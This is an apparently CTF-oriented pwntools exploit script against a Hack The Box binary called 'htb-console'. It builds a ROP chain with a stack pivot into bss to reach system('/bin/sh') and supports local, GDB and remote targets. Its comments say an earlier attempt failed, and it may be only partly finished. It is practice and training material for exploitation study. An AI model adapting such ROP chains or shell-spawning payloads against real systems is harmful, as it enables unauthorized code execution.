#!/usr/bin/env python3

from pwn import *

e = ELF("./htb-console_patched")
# libc = ELF('./libc.so.6')
rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main+0x30)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # TL;DR: staged attack + stack pivot

    r.sendlineafter(b'>>', b'date')
    r.sendlineafter(b'>>', b'hof')
    r.sendlineafter(b'Enter your name:', b'/./bin/sh')
    r.sendlineafter(b'>>', b'flag')

    # Failed because when we jump to the fgets(), the stdin param will be 0 which is wrong.
    # Stage 1: redirect to read again but into the bss() this time. Also overwrite the RBP to bss().
    pop_rdi = rop.rdi[0]
    ret = rop.find_gadget(['ret'])[0]
    system_plt = e.plt.system
    bss = e.bss()
    fgets_call = 0x401298
    info(f'The bss is at {hex(bss)}')
    info(f'The "pop rdi; ret" is at {hex(pop_rdi)}')
    info(f'The "ret" is at {hex(ret)}')
    info(f'The system.plt is at {hex(system_plt)}')
    payload = flat(
            b'\x90' * 16,
            bss,    # overwrite the RBP
            pop_rdi,
            bss,
            fgets_call,
            )
    r.sendlineafter(b'Enter flag:', payload)

    r.interactive()

if __name__ == "__main__":
    main()
